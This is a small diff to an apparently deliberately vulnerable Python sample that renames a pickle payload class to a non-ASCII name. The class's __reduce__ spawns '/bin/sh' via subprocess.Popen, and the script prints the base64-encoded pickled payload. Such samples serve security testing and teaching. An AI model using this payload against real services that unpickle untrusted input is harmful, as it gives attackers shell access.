@@ -20,7 +20,7 @@ def foofoo(user):
 
 
 # Pickles
-class RunBinSh():
+class Runbiš():
     def __reduce__(self):
         return (subprocess.Popen, (('/bin/sh',),))
 
@@ -34,4 +34,4 @@ def index():
     import_urlib_version(module)
 
 
-print(base64.b64encode(pickle.dumps(RunBinSh())))
+print(base64.b64encode(pickle.dumps(Runbiš())))
